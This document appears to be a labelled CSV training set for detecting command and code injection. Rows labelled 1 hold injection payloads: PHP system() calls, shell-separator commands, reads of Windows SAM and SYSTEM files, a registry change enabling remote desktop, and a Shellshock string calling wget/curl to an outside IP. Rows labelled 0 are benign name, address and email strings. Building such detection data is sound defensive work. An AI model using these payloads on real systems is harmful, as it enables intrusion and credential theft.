sentence,Label
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",1
"<?php system(""sleep 10"");?>",1
"<?php system(""sleep 5"");?>",1
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",1
:phpversion();,1
`ping 127.0.0.1`,1
& ping -i 30 127.0.0.1 &,1
& ping -n 30 127.0.0.1 &,1
;${@print(md5(RCEVulnerable))};,1
"${@print(""RCEVulnerable"")}",1
${@print(system($_SERVER['HTTP_USER_AGENT']))},1
pwd,1
| pwd,1
; pwd,1
& pwd,1
&& pwd,1
\r,1
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
\r\n,1
route,1
| sleep 1,1
; sleep 1,1
& sleep 1,1
&& sleep 1,1
sleep 1,1
|| sleep 10,1
| sleep 10,1
; sleep 10,1
{${sleep(10)}},1
& sleep 10 ,1
&& sleep 10,1
sleep 10,1
|| sleep 15,1
| sleep 15,1
; sleep 15,1
& sleep 15 ,1
&& sleep 15,1
 {${sleep(20)}},1
{${sleep(20)}},1
 {${sleep(3)}},1
{${sleep(3)}},1
| sleep 5,1
; sleep 5,1
& sleep 5,1
&& sleep 5,1
sleep 5,1
 {${sleep(hexdec(dechex(20)))}} ,1
{${sleep(hexdec(dechex(20)))}} ,1
sysinfo,1
| sysinfo,1
; sysinfo,1
& sysinfo,1
&& sysinfo,1
system('cat C:\boot.ini');,1
system('cat config.php');,1
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
system('curl https://crowdshield.com/.testing/rce_vuln.txt'),1
system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),1
system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,1
system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
systeminfo,1
| systeminfo,1
; systeminfo,1
& systeminfo,1
&& systeminfo,1
system('ls'),1
system('pwd'),1
system('pwd');,1
|| system('sleep 5');,1
| system('sleep 5');,1
; system('sleep 5');,1
& system('sleep 5');,1
&& system('sleep 5');,1
system('sleep 5'),1
system('sleep 5');,1
system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),1
system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,1
system('whoami'),1
system('whoami');,1
test*; ls -lhtR /var/www/,1
"test* || perl -e 'print ""X""x16096'",1
"test* | perl -e 'print ""X""x16096'",1
"test* & perl -e 'print ""X""x16096'",1
"test* && perl -e 'print ""X""x16096'",1
"test*; perl -e 'print ""X""x16096'",1
$(`type C:\boot.ini`),1
&&type C:\\boot.ini,1
| type C:\Windows\repair\SAM,1
; type C:\Windows\repair\SAM,1
& type C:\Windows\repair\SAM,1
&& type C:\Windows\repair\SAM,1
type C:\Windows\repair\SAM,1
| type C:\Windows\repair\SYSTEM,1
; type C:\Windows\repair\SYSTEM,1
& type C:\Windows\repair\SYSTEM,1
&& type C:\Windows\repair\SYSTEM,1
type C:\Windows\repair\SYSTEM,1
| type C:\WINNT\repair\SAM,1
; type C:\WINNT\repair\SAM,1
& type C:\WINNT\repair\SAM,1
&& type C:\WINNT\repair\SAM,1
type C:\WINNT\repair\SAM,1
type C:\WINNT\repair\SYSTEM,1
| type %SYSTEMROOT%\repair\SAM,1
; type %SYSTEMROOT%\repair\SAM,1
& type %SYSTEMROOT%\repair\SAM,1
&& type %SYSTEMROOT%\repair\SAM,1
type %SYSTEMROOT%\repair\SAM,1
| type %SYSTEMROOT%\repair\SYSTEM,1
; type %SYSTEMROOT%\repair\SYSTEM,1
& type %SYSTEMROOT%\repair\SYSTEM,1
&& type %SYSTEMROOT%\repair\SYSTEM,1
type %SYSTEMROOT%\repair\SYSTEM,1
uname,1
;uname;,1
| uname -a,1
; uname -a,1
& uname -a,1
&& uname -a,1
uname -a,1
|/usr/bin/id,1
;|/usr/bin/id|,1
;/usr/bin/id|,1
$;/usr/bin/id,1
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",1
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,1
| wget http://crowdshield.com/.testing/rce.txt,1
& wget http://crowdshield.com/.testing/rce.txt,1
; wget https://crowdshield.com/.testing/rce_vuln.txt,1
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),1
&& wget https://crowdshield.com/.testing/rce_vuln.txt,1
wget https://crowdshield.com/.testing/rce_vuln.txt,1
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
which curl,1
which gcc,1
which nc,1
which netcat,1
which perl,1
which python,1
which wget,1
whoami,1
| whoami,1
; whoami,1
' whoami,1
' || whoami,1
' & whoami,1
' && whoami,1
'; whoami,1
" whoami
 || whoami",1
" | whoami
 & whoami",1
" && whoami
; whoami",1
$(`whoami`),1
& whoami,1
&& whoami,1
"{{ get_user_file(""C:\boot.ini"") }}",1
"{{ get_user_file(""/etc/hosts"") }}",1
{{4+4}},1
{{4+8}},1
{{person.secret}},1
{{person.name}},1
{1} + {1},1
{% For c in [1,1
{{[] .__ Class __.__ base __.__ subclasses __ ()}},1
antigua de ancora s/n,0
calle dean miranda 106,0
10380,0
madgett,0
gerola pugliesi,0
36574,0
c/ comedias,0
8.61689E+15,0
tanchak,0
antigua de ancora s/n,0
calle dean miranda 106,0
10380,0
madgett,0
gerola pugliesi,0
36574,0
c/ comedias,0
8.61689E+15,0
tanchak,0
don quijote 81,0
ceferina,0
saturnino,0
israel_piggot@joyclub.pe,0
5n37do,0
lanfranchi@getgold.tl,0
micaas,0
herrmann@codwatw.edu,0
9.48E+15,0
5.83899E+15,0
ajoy,0
irissou,0
quisto,0
s5bal850de,0
balsam-prey@mmo.com.cat,0
lurlene,0
c/ elvas 112,0
de canoves 13,0
hembrick,0
1.76488E+15,0
darcy@google-movil.dz,0
katia,0
lenya@fbi-criminal-network.com.mil,0
3.81894E+15,0
penarroya ingla,0
6.65741E+15,0
calle artigako haritza,0
kiyohara,0
iracema,0
2719,0
recabdador,0
40142,0
bernadet,0
76150645z,0
29540,0
nehemiah,0
reiji,0
plaa gabriela mistral,0
mirabel,0
sanidad,0
arriharn espinet,0
alguer murillo,0
47419,0
swearing,0
lightfie,0
epnimo,0
guillen,0
mahbeer,0
zohar@pablobracamonte.bh,0
azarshah,0
m7124v3,0
medianero,0
euzaine@schnapps.com.gs,0
amelia,0
estival,0
3.98E+15,0
calle manco,0
vinko,0
parke antonio trueba 175,0
8.5138E+15,0
9.84215E+15,0
calle la revoltosa,0
calle hostieros,0
condensativo,0
44706,0
5.88977E+15,0
poma gozalbo,0
40592671v,0
contreras,0
18611,0
ma724-3ra,0
olaya,0
17744,0
7118,0
19219,0
lula,0
9.84is22nte334c799,0
rub de bracamonte,0
75771832b,0
muthuswa,0
d76en3r9n8z01,0
c/ padilla,0
8.85119E+15,0
salter@quiromante.com.mg,0
es3regamiento,0
aflechate,0
63829565b,0
60613075w,0
freydig rueda,0
itrabo,0
credido poma,0
29491,0
1064,0
gula,0
de1l2nda9ur4,0
c/ honduras,0
vajih,0
salinillas de bureba,0
6267,0
c/ san ildefonso 106 10?h,0
goldsmith1@esmarbella.ht,0
arraia-maeztu,0
34112,0
protoalbitar,0
pontevedra,0
savoula,0
2144,0
albeta,0
96761343k,0
lamentante,0
50159319e,0
andrs castanyer,0
neugebauer@buscamoto.gw,0
harmony,0
vlez acejas,0
enlutada,0
gabriela1,0
c/ david 169 6-h,0
methi,0
graciliano,0
61,0
4.13841E+15,0
steele,0
1.44E+15,0
brockie,0
depredador,0
comalada,0
7633,0
robledo,0
37793,0
archie,0
47649,0
4a2ho4a2o,0
c/ coca de la piera 167,0
oseja,0
31410,0
1.07544E+15,0
36823414t,0
ginest baquedano,0
mallo etchart,0
nanclares espejo,0
serpiginoso,0
calle dinamarca 14,0
72523597c,0
67242195q,0
6.05128E+15,0
aricel,0
c/ concepcion alexandre 82,0
v5llo34,0
burg,0
4135,0
10161,0
chorrito bajo,0
8623,0
l1b6855ca30e,0
en546al,0
c/ el breton,0
koichi,0
lamarr@tardos.mobi,0
mieza,0
16154,0
salgado,0
16118,0
zapardiel de la ribera,0
maughan@enfuerteventura.com.rw,0
15994230f,0
nazareno,0
shou-che,0
24152,0
villalobn,0
cardedeu 54,0
pl. curro cuchares,0
romeral,0
10300,0
firat6,0
calle marino cervera,0
sparky,0
strock,0
radunsky_oses@guejosgratis.cg,0
alfredo calderon 136,0
hanzlice,0
paucides,0
6.03007E+15,0
puigpunyent,0
zangn,0
chilln,0
6110,0
galindo beneyto,0
ayyuce,0
de_la,0
aventino,0
47185,0
5ecom058a?8a,0
lugar los morros,0
hinkie@goovitae.pg,0
58305784w,0
9.26768E+15,0
grimm@madrid2012.nu,0
michigan,0
igal,0
c/ hermanos pinzon 178,0
grandy,0
serneo,0
bellaguarda,0
cuesta sagrado corazon,0
pike@multasdetransito.gf,0
veneranda,0
torre de arcas,0
darrieu@redstarz.sv,0
sntoma,0
niu,0
eduviges,0
42010181z,0
minera dauns,0
8.96125E+15,0
arima@hormigon-impreso.nu,0
aguinaga achutegui,0
6.90524E+15,0
bradney4,0
shanir,0
34855320q,0
wun,0
stanger-kitabayashi7@gestionsoftware.th,0
calle soria 154 2a,0
humfrey,0
1320,0
poncin@todobetis.mil,0
8170,0
inglis@baltasarsantos.vu,0
tindall-bourne@pintandomucho.cg,0
es518l132n,0
rajadell,0
ramblizo,0
d060u2ar,0
8349,0
brunton9,0
sile,0
8935,0
4.5422E+15,0
1.35689E+15,0
azcrate campalan,0
calle juan sebastian elcano,0
heicy,0
62,0
massimil,0
n89m3nd2,0
6.69143E+14,0
kindelan,0
a79ga44,0
49540097y,0
2.75339E+15,0
ibarra,0
18898337l,0
47gent1r,0
estolano boget,0
sierra bermeja s/n,0
jimnez algora,0
ponsati puratic,0
ocallaghan@asyra.li,0
28670,0
calle joan salvat papasseit s/n,0
28721,0
nardi borgua,0
roger,0
san miguel de abona,0
denni,0
cercs,0
d0s9pi2car,0
o$ficinesca,0
conde,0
menju,0
mccollon@irmedia.ca,0
88360528w,0
16856,0
pesquisar,0
subidor,0
escudero ostria,0
calle conde de cartagena 97 5f,0
3.67249E+15,0
3471,0
marines,0
senda buen paso s/n,0
5366,0
henry@sms24h.tr,0
santaren,0
mejury8,0
38355013y,0
trooger_gereighty@quierocortinas.mil,0
06673981w,0
pche,0
hervs bediaga,0
longo,0
tunaroza capmany,0
37795,0
flixmara,0
roni,0
sertino,0
umbria,0
veri5icat1va,0
2.22584E+14,0
mouchet@007tv.fj,0
parolero,0
polanco,0
jackelyn,0
34310,0
9ar5i04o,0
indocto,0
kouraviev@socimi.com.gl,0
saleh,0
e72i4,0
sant andreu de la barca,0
f8av2,0
49211,0
karin,0
gu5cima,0
keng@glutenfreespain.lb,0
69671861p,0
doriot,0
6.71861E+15,0
gregonio,0
38821598j,0
katy,0
angullo acosta,0
c63en13759,0
23611263s,0
29850288z,0
cancela,0
c/ grabador david roberts 154 1-h,0
1.02549E+15,0
37110,0
de tena leguizamn,0
5154,0
eddisfor4,0
4560,0
4.92079E+15,0
monvar/monver,0
pobla de segur 125,0
23670,0
3.82074E+15,0
15318,0
8121,0
41713468r,0
3.18663E+15,0
san petersburgo,0
71648159p,0
4176,0
gift@distritoeste.no,0
16601924h,0
segura reygadas,0
passeig gaudi 77,0
llasera,0
ca5r7211a,0
16610,0
cantoria,0
hallaran@manjarr.cd,0
haker-durango@mirallesmoscardo.ro,0
22010612a,0
trastabilln,0
rocco-misaki@soybueno.nz,0
20120,0
leonel,0
micr6pil8,0
calle puebla de los infantes,0
bscones de ojeda,0
ares,0
marcelino suarez 39,0
847,0
adalgisa,0
5150,0
88253687l,0
decour raichs,0
cusanelli@wdsl.ao,0
perpi izurrieta,0
robin@comerciosdeaspe.info,0
barcelona 149,0
66718383y,0
incom1a5abl8mente,0
leni,0
baril,0
35210254z,0
teddie,0
espaldilla,0
1.06705E+14,0
reiko,0
portelan9,0
50645313a,0
c28a3iz8,0
45370,0
benavente,0
99020664y,0
5arneci052,0
chimeneas,0
bose,0
041!da2131434e,0
5e011llo,0
c/ relfas 122,0
murillo el cuende,0
aa,0
c/ clivia,0
peral,0
3j,0
3411,0
carretera ribas matama 160,0
18567,0
arco del meson,0
57186589x,0
surai,0
3820,0
childree,0
712,0
bidaurreta,0
sfiroudi,0
caesar-vitez2@apelton.sy,0
56702228y,0
carrera,0
claudio,0
mary-ann,0
norberto,0
caldes,0
7.28065E+15,0
42462633x,0
557ni03r5o,0
shakor,0
rasmia,0
tarp@redstarz.asia,0
seno,0
medwin-whittinghill@enla.th,0
rodolfo,0
hermanos gascon 141,0
28530,0
5083,0
soman,0
84411118z,0
45256,0
tornadizos de vila,0
calle santa teresa,0
incrdu69,0
llombai,0
8.00405E+14,0
ulrico,0
gatada,0
linton,0
gustat0v4,0
6.27383E+15,0
81,0
huyente,0
m9gnificen5i5,0
werkmeister@19horas.zr,0
2100,0
22120,0
rabascall,0
braiam,0
8.99091E+15,0
hofmeist0,0
calle duque de zaragoza s/n,0
c/ san guillermo,0
sahid,0
6660,0
wilde@casasdefamosos.zw,0
9903rti37,0
bablica,0
07485924e,0
5.25502E+15,0
encuar,0
ramss,0
6160,0
0e06u8s17,0
4.61733E+15,0
mclawhor,0
44338,0
fabrelle,0
hormilleja,0
mayor,0
28815,0
pascuala,0
malditamente,0
4.47874E+15,0
5.9555E+15,0
spaeth@directoriogratuito.kr,0
19784273h,0
84881293t,0
carretera estacion,0
coxcojita,0
mohandas,0
cel65co,0
3.21396E+15,0
9805,0
75131649x,0
pierre-y,0
4.46813E+15,0
en8og1da,0
collado mediano,0
des7768ab9e6os,0
gabby,0
isasi urquiza,0
20001,0
cherino gebhardt,0
tracee,0
8615,0
3814,0
perdign,0
c/ corua,0
sangborivutr@ssextremadura.gr,0
tali,0
26256,0
3675,0
5458,0
